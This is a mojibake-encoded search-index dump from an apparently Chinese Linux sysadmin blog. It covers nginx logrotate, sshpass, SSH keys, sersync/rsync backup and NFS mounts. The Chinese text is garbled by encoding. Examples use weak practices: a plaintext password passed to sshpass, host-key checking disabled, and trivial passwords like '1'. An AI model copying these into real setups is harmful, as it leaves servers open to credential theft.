18:04","objectID":"/post/210/:8:0","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"é…ç½®logrotateï¼š vim /etc/logrotate.d/nginx /application/nginx-1.14.2/logs/*log { create 0664 www root daily rotate 10 dateext missingok notifempty compress sharedscripts postrotate /bin/kill -USR1 `cat /application/nginx/logs/nginx.pid 2\u003e/dev/null` 2\u003e/dev/null || true endscript } ","date":"2019-06-01 18:04","objectID":"/post/210/:9:0","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"PV(è®¿é—®é‡)ï¼šPage View, å³é¡µé¢æµè§ˆé‡æˆ–ç‚¹å‡»é‡ï¼Œç”¨æˆ·æ¯æ¬¡åˆ·æ–°å³è¢«è®¡ç®—ä¸€æ¬¡ã€‚ UV(ç‹¬ç«‹è®¿å®¢)ï¼šUnique Visitor,ä¸€èˆ¬ä½¿ç”¨cookieæ ‡è®°,è®¿é—®æ‚¨ç½‘ç«™çš„ä¸€å°ç”µè„‘å®¢æˆ·ç«¯ IP(ç‹¬ç«‹IP)ï¼šæŒ‡ç‹¬ç«‹IPæ•°ã€‚00:00-24:00å†…ç›¸åŒIPåœ°å€ä¹‹è¢«è®¡ç®—ä¸€æ¬¡(å¤šå°ç”µè„‘å¯èƒ½å…±ç”¨ä¸€ä¸ªip)ã€‚ ","date":"2019-06-01 18:03","objectID":"/post/208/:0:0","tags":[],"title":"è¡¡é‡ç½‘ç«™è®¿é—®é‡çš„å•ä½:IP,PV,UVå«ä¹‰","uri":"/post/208/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":" [root@m01 ~]#Â ssh 172.16.1.7 hostname The authenticity of host '172.16.1.7 (172.16.1.7)' can't be established. ECDSA key fingerprint is SHA256:qI7TJf59/RPaLxO+x7DZN88pU7WFjuZ2yYpPKvJmicg. ECDSA key fingerprint is MD5:af:2a:5a:5e:f9:d1:83:1e:e6:17:bc:a8:6d:0b:c4:e5. Are you sure you want to continue connecting (yes/no)? -oStrictHostKeyChecking=no:è§£å†³ç¬¬ä¸€æ¬¡ç™»é™†æç¤ºï¼ˆå¦‚ä¸Šï¼‰ ","date":"2019-06-01 18:01","objectID":"/post/206/:0:0","tags":["ssh","pssh"],"title":"ä½¿ç”¨sshpasså®ç°éäº¤äº’è¿æ¥æœåŠ¡å™¨","uri":"/post/206/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"sshpasså·¥å…·éœ€è¦å•ç‹¬å®‰è£…ï¼Œå®ƒå¯ä»¥ä¸ºsshç›¸å…³å‘½ä»¤æä¾›å¯†ç  ","date":"2019-06-01 18:01","objectID":"/post/206/:1:0","tags":["ssh","pssh"],"title":"ä½¿ç”¨sshpasså®ç°éäº¤äº’è¿æ¥æœåŠ¡å™¨","uri":"/post/206/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"sshpassåœ¨epelæºä¸­ï¼Œéœ€è¦å…ˆé…ç½®epelæºåœ¨è¿›è¡Œå®‰è£…ï¼Œä¹Ÿå¯ä»¥å®‰è£…ansible(è‡ªå¸¦sshpass)æˆ–è€…ä½¿ç”¨æºä»£ç å®‰è£… [root@m01 ~]# yum install -y epel-release [root@m01 ~]# yum install -y sshpass [root@m01 ~]# sshpass -p123456 -oStrictHostKeyChecking=noÂ ssh root@172.16.1.41 hostname backup ","date":"2019-06-01 18:01","objectID":"/post/206/:2:0","tags":["ssh","pssh"],"title":"ä½¿ç”¨sshpasså®ç°éäº¤äº’è¿æ¥æœåŠ¡å™¨","uri":"/post/206/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"~/.ssh/ç›®å½•æ–‡ä»¶è¯´æ˜ï¼š authorized_keys:è®°å½•å…¬é’¥çš„æ–‡ä»¶ï¼Œå¯¹ç«¯çš„ç§é’¥å’Œæ­¤æ–‡ä»¶ä¸­çš„å…¬é’¥åŒ¹é…æˆåŠŸå³å¯ç™»å½• id_rsa : ç”Ÿæˆçš„ç§é’¥æ–‡ä»¶ id_rsa.pub ï¼š ç”Ÿæˆçš„å…¬é’¥æ–‡ä»¶ ç›®å½•æ–‡ä»¶æƒé™ï¼š .sshç›®å½•ï¼š700 .ssh/authorized_keysæ–‡ä»¶ï¼š600 #ç”Ÿæˆç§˜é’¥å¯¹ [root@m01 ~]# ssh-keygenÂ -t dsa Generating public/private dsa key pair. Enter file in which to save the key (/root/.ssh/id_dsa): Created directory â€˜/root/.sshâ€™. Enter passphrase (empty for no passphrase): Enter same passphrase again: ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚çœç•¥ #å°†å…¬é’¥å‘é€åˆ°å…¶ä»–æœåŠ¡å™¨ä¸­ -i:æŒ‡å®šå…¬é’¥æ–‡ä»¶ [root@m01 ~]# ssh-copy-idÂ -i /root/.ssh/id_dsa.pubÂ root@172.16.1.41 #æµ‹è¯•è¿œç¨‹æ‰§è¡Œå‘½ä»¤ [root@m01 ~]# ssh 172.16.1.41 hostname backup ","date":"2019-06-01 17:59","objectID":"/post/204/:0:0","tags":["ssh","ç§˜é’¥"],"title":"sshå¯†é’¥è®¤è¯","uri":"/post/204/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"sersync githubä¸‹è½½åœ°å€ï¼šhttps://github.com/wsgzao/sersync/ (ä¸‹è½½è¿™ä¸ªsersync2.5.4_64bit_binary_stable_final.tar.gz) sersyncï¼šç›‘æ§ç›®å½•çš„å˜åŒ–ï¼Œæ¨é€åˆ°rsyncæœåŠ¡å™¨ä¸Š è¿™é‡Œæ£€æµ‹åˆ°æŒ‡å®šç›®å½•æ–‡ä»¶æœ‰å˜åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨rsyncåŒæ­¥åˆ°backupæœåŠ¡å™¨ä¸­(backupæœåŠ¡å™¨å®‰è£…rsyncæœåŠ¡) ","date":"2019-06-01 17:58","objectID":"/post/202/:0:0","tags":["rsync"],"title":"sersyncå®ç°å®æ—¶åŒæ­¥å¤‡ä»½","uri":"/post/202/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1ã€å®‰è£… è§£å‹åå¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶:sersyncï¼Œconfxml.xml,ç§»åŠ¨åˆ°/usr/local/sersyncç›®å½•ä¸‹ï¼ˆç›®å½•ç»“æ„å¯ä»¥è‡ªå·±åˆ›å»ºï¼‰ [root@nfs01 ~]# tree /usr/local/sersync/ /usr/local/sersync/ â”œâ”€â”€ bin â”‚ â””â”€â”€ sersync â”œâ”€â”€ conf â”‚ â””â”€â”€ confxml.xml â””â”€â”€ logs #åˆ›å»ºè½¯è¿æ¥ï¼Œæ–¹ä¾¿ä»¥åä½¿ç”¨ [root@nfs01 sersync]# ln -s /usr/local/sersync/bin/sersync /bin/ [root@nfs01 sersync]# chmod +x /usr/local/sersync/bin/sersync ","date":"2019-06-01 17:58","objectID":"/post/202/:1:0","tags":["rsync"],"title":"sersyncå®ç°å®æ—¶åŒæ­¥å¤‡ä»½","uri":"/post/202/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"2ã€ä¿®æ”¹é…ç½®æ–‡ä»¶ æ‰“å¼€confxml.xmlé…ç½®æ–‡ä»¶ \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\" ?\u003e - \u003chead version=\"2.5\"\u003e \u003chost hostip=\"localhost\" port=\"8008\" /\u003e \u003cdebug start=\"false\" /\u003e \u003cfileSystem xfs=\"true\" /\u003e # æ–‡ä»¶ç³»ç»Ÿç±»å‹ï¼Œæ ¹æ®è‡ªå·±çš„åˆ†åŒºç±»å‹é€‰æ‹© # æ­¤å¤„å¯è®¾ç½®éœ€è¦è¿‡æ»¤çš„æ–‡ä»¶ç±»å‹ - \u003cfilter start=\"false\"\u003e \u003cexclude expression=\"(.*)\\.svn\" /\u003e \u003cexclude expression=\"(.*)\\.gz\" /\u003e \u003cexclude expression=\"^info/*\" /\u003e \u003cexclude expression=\"^static/*\" /\u003e \u003c/filter\u003e - \u003cinotify\u003e # ç›‘æ§æ–‡ä»¶ç›®å½•çš„å˜åŒ– \u003cdelete start=\"true\" /\u003e \u003ccreateFolder start=\"true\" /\u003e \u003ccreateFile start=\"false\" /\u003e \u003ccloseWrite start=\"true\" /\u003e \u003cmoveFrom start=\"true\" /\u003e \u003cmoveTo start=\"true\" /\u003e \u003cattrib start=\"false\" /\u003e \u003cmodify start=\"false\" /\u003e \u003c/inotify\u003e - \u003csersync\u003e - \u003clocalpath watch=\"/data\"\u003e # ç›‘æ§çš„ç›®å½• \u003cremote ip=\"172.16.1.41\" name=\"nfsbackup\" /\u003e # rsyncæœåŠ¡å™¨çš„IP(ä¹Ÿå°±æ˜¯backupæœåŠ¡å™¨)å’Œæ¨¡å—åç§° - \u003c!-- \u003cremote ip=\"192.168.8.39\" name=\"tongbu\"/\u003e--\u003e - \u003c!-- \u003cremote ip=\"192.168.8.40\" name=\"tongbu\"/\u003e--\u003e \u003c/localpath\u003e - \u003crsync\u003e \u003ccommonParams params=\"-az\" /\u003e # rsyncå‘½ä»¤æ‰§è¡Œå‚æ•° \u003cauth start=\"true\" users=\"nfsbackup\" passwordfile=\"/etc/nfsbackup.password\" /\u003e # users:rsyncè®¤è¯ç”¨æˆ·åï¼Œpasswordfile:å¯†ç æ–‡ä»¶ \u003cuserDefinedPort start=\"false\" port=\"874\" /\u003e - \u003c!-- port=874 --\u003e \u003ctimeout start=\"false\" time=\"100\" /\u003e - \u003c!-- timeout=100 --\u003e \u003cssh start=\"false\" /\u003e \u003c/rsync\u003e \u003cfailLog path=\"/tmp/rsync_fail_log.sh\" timeToExecute=\"60\" /\u003e # æ—¥å¿—æ–‡ä»¶è·¯å¾„ - \u003c!-- default every 60mins execute once --\u003e - \u003ccrontab start=\"false\" schedule=\"600\"\u003e - \u003c!-- 600mins --\u003e - \u003ccrontabfilter start=\"false\"\u003e \u003cexclude expression=\"*.php\" /\u003e \u003cexclude expression=\"info/*\" /\u003e \u003c/crontabfilter\u003e \u003c/crontab\u003e \u003cplugin start=\"false\" name=\"command\" /\u003e \u003c/sersync\u003e - \u003cplugin name=\"command\"\u003e \u003cparam prefix=\"/bin/sh\" suffix=\"\" ignoreError=\"true\" /\u003e - \u003c!-- prefix /opt/tongbu/mmm.sh suffix --\u003e - \u003cfilter start=\"false\"\u003e \u003cinclude expression=\"(.*)\\.php\" /\u003e \u003cinclude expression=\"(.*)\\.sh\" /\u003e \u003c/filter\u003e \u003c/plugin\u003e - \u003cplugin name=\"socket\"\u003e - \u003clocalpath watch=\"/opt/tongbu\"\u003e \u003cdeshost ip=\"192.168.138.20\" port=\"8009\" /\u003e \u003c/localpath\u003e \u003c/plugin\u003e - \u003cplugin name=\"refreshCDN\"\u003e - \u003clocalpath watch=\"/data0/htdocs/cms.xoyo.com/site/\"\u003e \u003ccdninfo domainname=\"ccms.chinacache.com\" port=\"80\" username=\"xxxx\" passwd=\"xxxx\" /\u003e \u003csendurl base=\"http://pic.xoyo.com/cms\" /\u003e \u003cregexurl regex=\"false\" match=\"cms.xoyo.com/site([/a-zA-Z0-9]*).xoyo.com/images\" /\u003e \u003c/localpath\u003e \u003c/plugin\u003e \u003c/head\u003e ","date":"2019-06-01 17:58","objectID":"/post/202/:2:0","tags":["rsync"],"title":"sersyncå®ç°å®æ—¶åŒæ­¥å¤‡ä»½","uri":"/post/202/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸»è¦ä¿®æ”¹ä½ç½® \u003cfileSystem xfs=\"true\"/\u003e #ä½¿ç”¨xfsæ–‡ä»¶ç³»ç»Ÿ \u003clocalpath watch=\"/data\"\u003e #æŒ‡å®šéœ€è¦ç›‘æ§çš„ç›®å½• \u003cremote ip=\"172.16.1.41\" name=\"nfsbackup\"/\u003e # æŒ‡å®šrsyncæœåŠ¡å™¨çš„ipå’Œæ¨¡å—å \u003ccommonParams params=\"-az\"/\u003e # ä½¿ç”¨-azå‚æ•° \u003cauth start=\"true\" users=\"nfsbackup\" passwordfile=\"/etc/nfsbackup.password\"/\u003e # æŒ‡å®šç”¨æˆ·åä¸ºï¼šnfsbackupå’Œå¯†ç æ–‡ä»¶ ","date":"2019-06-01 17:58","objectID":"/post/202/:2:1","tags":["rsync"],"title":"sersyncå®ç°å®æ—¶åŒæ­¥å¤‡ä»½","uri":"/post/202/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"é…ç½®backupæœåŠ¡å™¨ï¼ˆrsyncæœåŠ¡ï¼‰ [root@backup uploads]# cat /etc/rsyncd.conf uid = rsync gid = rsync fake super = yes use chroot = no max connections = 200 timeout = 300 pid file = /var/run/rsyncd.pid lock file = /var/run/rsync.lock log file = /var/log/rsyncd.log ignore errors read only = false list = false hosts allow = 172.16.1.0/24 #hosts deny = 0.0.0.0/32 [backup] path = /backup/ auth users = backup secrets file = /etc/backup.password [nfsbackup] path = /nfsbackup auth users = nfsbackup secrets file = /etc/nfsbackup.password ","date":"2019-06-01 17:58","objectID":"/post/202/:3:0","tags":["rsync"],"title":"sersyncå®ç°å®æ—¶åŒæ­¥å¤‡ä»½","uri":"/post/202/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å¯åŠ¨sersyncå®ˆæŠ¤è¿›ç¨‹æ¨¡å¼ æŸ¥çœ‹å¸®åŠ© [root@nfs01 bin]# sersync -h set the system param executeï¼šecho 50000000 \u003e /proc/sys/fs/inotify/max_user_watches executeï¼šecho 327679 \u003e /proc/sys/fs/inotify/max_queued_events parse the command param å‚æ•°-d:å¯ç”¨å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼ å‚æ•°-r:åœ¨ç›‘æ§å‰ï¼Œå°†ç›‘æ§ç›®å½•ä¸è¿œç¨‹ä¸»æœºç”¨rsyncå‘½ä»¤æ¨é€ä¸€é å‚æ•°-n: æŒ‡å®šå¼€å¯å®ˆæŠ¤çº¿ç¨‹çš„æ•°é‡ï¼Œé»˜è®¤ä¸º10ä¸ª å‚æ•°-o:æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œé»˜è®¤ä½¿ç”¨confxml.xmlæ–‡ä»¶ å‚æ•°-m:å•ç‹¬å¯ç”¨å…¶ä»–æ¨¡å—ï¼Œä½¿ç”¨ -m refreshCDN å¼€å¯åˆ·æ–°CDNæ¨¡å— å‚æ•°-m:å•ç‹¬å¯ç”¨å…¶ä»–æ¨¡å—ï¼Œä½¿ç”¨ -m socket å¼€å¯socketæ¨¡å— å‚æ•°-m:å•ç‹¬å¯ç”¨å…¶ä»–æ¨¡å—ï¼Œä½¿ç”¨ -m http å¼€å¯httpæ¨¡å— ä¸åŠ -må‚æ•°ï¼Œåˆ™é»˜è®¤æ‰§è¡ŒåŒæ­¥ç¨‹åº ##å¼€å¯æœåŠ¡ sersync -r -d -o /usr/local/sersync/conf/confxml.xml åœ¨é¦–æ¬¡æ­£å¸¸æ‰§è¡Œåï¼Œæ­¤æ—¶/dataç›®å½•çš„å†…å®¹ä¼šå…¨éƒ¨æ¨é€åˆ°backupæœåŠ¡å™¨çš„/nfsbackupç›®å½•ä¸‹ ","date":"2019-06-01 17:58","objectID":"/post/202/:4:0","tags":["rsync"],"title":"sersyncå®ç°å®æ—¶åŒæ­¥å¤‡ä»½","uri":"/post/202/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"#rsyncæœåŠ¡å™¨å’ŒnfsæœåŠ¡å™¨éƒ½éœ€è¦å®‰è£…nfså·¥å…· yum install -y nfs-utils rpcbind æœåŠ¡ç«¯é…ç½® #æœåŠ¡ç«¯å¯åŠ¨nfså’Œrpcbind [root@nfs01 ~]# systemctl start rpcbind [root@nfs01 ~]# systemctl start nfs #æŸ¥çœ‹rpcæ³¨å†Œä¿¡æ¯ [root@nfs01 ~]#Â rpcinfo -p localhost #æŸ¥çœ‹nfså…±äº«çš„ç›®å½• [root@nfs01 ~]# showmount -e locahost Export list for localhost: #é…ç½®nfså…±äº«ç›®å½• [root@nfs01 ~]# vim /etc/exports #share /data /dataÂ 172.16.1.0/24(rw,sync,all_squash) ############################################################################ ç¬¬ä¸€è¡Œ:æ³¨é‡Šè¯´æ˜ ç¬¬äºŒè¡Œ:å…±äº«çš„ç›®å½•å’Œå…è®¸è®¿é—®çš„ipæ®µï¼Œrw:è¯»å†™æƒé™ï¼Œsync:å®æ—¶åŒæ­¥,all_squash:å°†æ‰€æœ‰ç”¨æˆ·å‹ç¼©ä¸ºnfsnobodyæ‰€æœ‰è€…å’Œç»„ æƒé™å‚æ•°ï¼š åªè¯»:ro è¯»å†™:rw all_squashè¿˜å¯ä»¥æ”¹ä¸ºå¦‚ä¸‹å†…å®¹ root_squash:å¦‚æœå®¢æˆ·ç«¯ç”¨æˆ·æ˜¯rootç”¨æˆ·è®¿é—®å°†è¢«å‹ç¼©ä¸ºnfsnobodyæ‰€æœ‰è€…å’Œç»„ no_root_squash:å¦‚æœå®¢æˆ·ç«¯ç”¨æˆ·æ˜¯rootç”¨æˆ·ï¼Œé‚£ä¹ˆä»–å¯¹å…±äº«ç›®å½•çš„æƒé™ä¸ºroot é»˜è®¤å‹ç¼©çš„ç”¨æˆ·ä¸ºnfsnobodyï¼Œæ‰‹åŠ¨æŒ‡å®šä¸¾ä¾‹ï¼š /dataÂ 172.16.1.0/24(rw,sync,all_squash,anonuid=888,anongid=888) anonuid:ç”¨æˆ·id anongid:ç»„id å¯¹åº”çš„å…±äº«ç›®å½•(/data)ä¹Ÿéœ€è¦å°†æ‰€æœ‰è€…å’Œç»„æ›´æ”¹ä¸ºä¸ä¸Šé¢è®¾ç½®ä¸€è‡´ ############################################################################ #åˆ›å»ºç›®å½•å¹¶å°†æ‰€æœ‰è€…æ”¹ä¸ºnfsnobody [root@nfs01 ~]# mkdir -p /data [root@nfs01 ~]# chown nfsnobody.nfsnobody /data #å¹³æ»‘é‡å¯nfsæœåŠ¡ [root@nfs01 ~]# systemctl reload nfs #æŸ¥çœ‹nfså…±äº«ç›®å½• [root@nfs01 ~]# showmount -e locahost Export list for locahost: /data 172.16.1.0/24 å®¢æˆ·ç«¯æŒ‚è½½ #æŒ‚è½½nfsæœåŠ¡å™¨çš„/dataç›®å½•æŒ‚è½½åˆ°rsyncæœåŠ¡å™¨çš„/mntç›®å½•ä¸‹(-tå‚æ•°æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿç±»å‹) [root@backup ~]# mount -t nfs 172.16.1.31:/data /mnt #æŸ¥çœ‹ç£ç›˜æŒ‚è½½æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°ç»“æœä¸­å­˜åœ¨ä»¥ä¸‹å†…å®¹ [root@backup ~]# df -Th 172.16.1.31:/data nfs4Â 48GÂ 1.9GÂ 47GÂ 4% /mnt #è®¾ç½®å¼€æœºè‡ªåŠ¨æŒ‚è½½ #centos7éœ€è¦è®¾ç½®æ‰§è¡Œæƒé™ [root@backup ~]# chmod +x /etc/rc.d/rc.local #åœ¨rc.localæ–‡ä»¶æœ«å°¾æ·»åŠ å¦‚ä¸‹å†…å®¹ mount -t nfs 172.16.1.31:/data /mnt ","date":"2019-06-01 17:57","objectID":"/post/200/:0:0","tags":["rsync","nfs"],"title":"é…ç½®nfså¹¶æŒ‚è½½ä½¿ç”¨","uri":"/post/200/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å¤‡ä»½æœåŠ¡å™¨æ­å»ºæœåŠ¡å™¨ç«¯ backup ","date":"2019-06-01 12:17","objectID":"/post/195/:0:0","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æœåŠ¡ç«¯é…ç½® ","date":"2019-06-01 12:17","objectID":"/post/195/:1:0","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åˆ›å»ºrsyncç”¨æˆ· useradd -s /sbin/nologin -M rsync ","date":"2019-06-01 12:17","objectID":"/post/195/:1:1","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åˆ›å»ºå¤‡ä»½ç›®å½• mkdir -p /backup ","date":"2019-06-01 12:17","objectID":"/post/195/:1:2","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¿®æ”¹ç›®å½•æ‰€æœ‰è€…å’Œç»„ä¸ºrsync chown rsync.rsync /backup/ ","date":"2019-06-01 12:17","objectID":"/post/195/:1:3","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åˆ›å»ºrsyncç”¨æˆ·å¯†ç æ–‡ä»¶ï¼Œè´¦å·rsync_backup,å¯†ç 1 echo â€˜rsync_backup:1â€™ \u003e/etc/rsync.password ","date":"2019-06-01 12:17","objectID":"/post/195/:1:4","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¿®æ”¹å¯†ç æ–‡ä»¶æƒé™ chmod 600 /etc/rsync.password ","date":"2019-06-01 12:17","objectID":"/post/195/:1:5","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š [root@backup ~]# cat /etc/rsyncd.conf uid = rsync gid = rsync fake super = yes use chroot = no max connections = 200 timeout = 300 pid file = /var/run/rsyncd.pid lock file = /var/run/rsync.lock log file = /var/log/rsyncd.log [backup] path = /backup/ ignore errors read only = false list = false hosts allow = 172.16.1.0/24 #hosts deny = 0.0.0.0/32 auth users = rsync_backup secrets file = /etc/rsync.password #################é…ç½®é¡¹è¯´æ˜######################## uid:æŒ‡å®šè¿è¡Œç”¨æˆ· gid:æŒ‡å®šç»„ fake super: use chroot: å¦‚æœ\"use chroot\"æŒ‡å®šä¸ºtrueï¼Œé‚£ä¹ˆrsyncåœ¨ä¼ è¾“æ–‡ä»¶ä»¥å‰é¦–å…ˆchrootåˆ°pathå‚æ•°æ‰€æŒ‡å®šçš„ç›®å½•ä¸‹ã€‚è¿™æ ·åšçš„åŸå› æ˜¯å®ç°é¢å¤–çš„å®‰å…¨é˜²æŠ¤ï¼Œä½†æ˜¯ç¼ºç‚¹æ˜¯éœ€è¦ä»¥rootsæƒé™ï¼Œå¹¶ä¸”ä¸èƒ½å¤‡ä»½æŒ‡å‘å¤–éƒ¨çš„ç¬¦å·è¿æ¥æ‰€æŒ‡å‘çš„ç›®å½•æ–‡ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹chrootå€¼ä¸ºtrueã€‚ max connections:æœ€å¤§è¿æ¥æ•° timeout:è¶…æ—¶æ—¶é—´ pid file:è¿›ç¨‹å·ä¿å­˜è·¯å¾„ lock file:é”æ–‡ä»¶ä¿å­˜è·¯å¾„ log file:æ—¥å¿—æ–‡ä»¶ä¿å­˜è·¯å¾„ [backup]:æ¨¡å—å path:æŒ‡å®šæ¨¡å—è·¯å¾„ ignore errors:å¿½ç•¥éƒ¨åˆ†é”™è¯¯ï¼Œä¸æ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸­ï¼Œå¯åœ¨æ—¥å¿—ä¸­æŸ¥çœ‹ read only:æ˜¯å¦åªè¯» list:æŸ¥çœ‹æ¨¡å—è·¯å¾„çš„å†…å®¹ hosts allow:å…è®¸è®¿é—®æ­¤æ¨¡å—çš„IPæ®µ(denyä¸ºæ‹’ç»ï¼ŒäºŒé€‰ä¸€å³å¯) auth users:è®¤è¯ç”¨æˆ·å secrets file:æŒ‡å®šç”¨æˆ·å¯†ç æ–‡ä»¶è·¯å¾„ ","date":"2019-06-01 12:17","objectID":"/post/195/:1:6","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å¯åŠ¨æœåŠ¡ [root@backup ~]# systemctl start rsyncd ","date":"2019-06-01 12:17","objectID":"/post/195/:1:7","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æŸ¥çœ‹è¿›ç¨‹æ˜¯å¦å­˜åœ¨ [root@backup ~]# ps -ef|grep rsync root 17177 1 0 14:52 ? 00:00:00 /usr/bin/rsync â€“daemon â€“no-detach root 17179 16652 0 14:52 pts/0 00:00:00 grep â€“color=auto rsync ","date":"2019-06-01 12:17","objectID":"/post/195/:1:8","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æŸ¥çœ‹ç«¯å£æ˜¯å¦ç›‘å¬ [root@backup ~]# ss -lntup |grep rsync tcp LISTEN 0 5 :873 : users:((â€œrsyncâ€,pid=17177,fd=4)) tcp LISTEN 0 5 :::873 ::: users:((â€œrsyncâ€,pid=17177,fd=5)) ","date":"2019-06-01 12:17","objectID":"/post/195/:1:9","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®¢æˆ·ç«¯é…ç½® ","date":"2019-06-01 12:17","objectID":"/post/195/:2:0","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å°†å¯†ç å†™åˆ°æ–‡ä»¶ä¸­å¹¶è®¾ç½®æƒé™(å®ç°éäº¤äº’) echo '1' \u003e/etc/rsync.password chmod 600 /etc/rsync.password ","date":"2019-06-01 12:17","objectID":"/post/195/:2:1","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å°†nfs01çš„/etcç›®å½•ä¼ è¾“åˆ°backupæœåŠ¡å™¨backupæ¨¡å—ä¸­ï¼Œå¹¶æŒ‡å®šå¯†ç æ–‡ä»¶ï¼ˆä¸åŠ â€“password-fileéœ€è¦æ‰‹åŠ¨è¾“å…¥å¯†ç ï¼‰ rsync -avz /etc rsync_backup@172.16.1.41::backup --password-file /etc/rsync.password ","date":"2019-06-01 12:17","objectID":"/post/195/:2:2","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä½¿ç”¨â€“excludeå’Œâ€“exclude-fromæ’é™¤æŸæ–‡ä»¶ä¼ è¾“ å°†/etc/hostnameæ–‡ä»¶æ’é™¤ï¼Œä¸ä¼ è¾“ rsync -avz /etc rsync_backup@172.16.1.41::backup --password-file /etc/rsync.password --exclude=/etc/hostname ","date":"2019-06-01 12:17","objectID":"/post/195/:2:3","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æŒ‰ç…§æ–‡ä»¶å†…å®¹æ’é™¤ [root@nfs01 ~]# cat /data/exclude.txt /etc/hostname /etc/hosts æ’é™¤/etc/hostnameï¼Œ/etc/hostsè¿™ä¸¤ä¸ªæ–‡ä»¶ rsync -avz /etc rsync_backup@172.16.1.41::backup --password-file /etc/rsync.password --exclude-from=/data/exclude.txt ","date":"2019-06-01 12:17","objectID":"/post/195/:2:4","tags":["rsync"],"title":"rsyncæœåŠ¡(å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼)","uri":"/post/195/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"rsyncæ³¨æ„ï¼šç›®å½•è¦æ±‚ /home ï¼š è¡¨ç¤ºå°†æ•´ä¸ª /home ç›®å½•å¤åˆ¶åˆ°ç›®æ ‡ç›®å½• /home/ ï¼š è¡¨ç¤ºå°† /home ç›®å½•ä¸­çš„æ‰€æœ‰å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡ç›®å½• Â  å‚æ•°è¯´æ˜ï¼š -a, â€“archiveÂ archive mode; equals -rlptgoD (no -H,-A,-X) -rlptgoD(å®é™…å‚æ•°) -rÂ â€“é€’å½’ç›®å½• -lÂ â€“links ä¼ è¾“é“¾æ¥æ–‡ä»¶Â -pÂ â€“perms æƒé™ -tÂ timeÂ æ–‡ä»¶æ—¶é—´ä¸å˜ -gÂ â€“group æ–‡ä»¶æ‰€æœ‰ç»„ -oÂ â€“ownerÂ 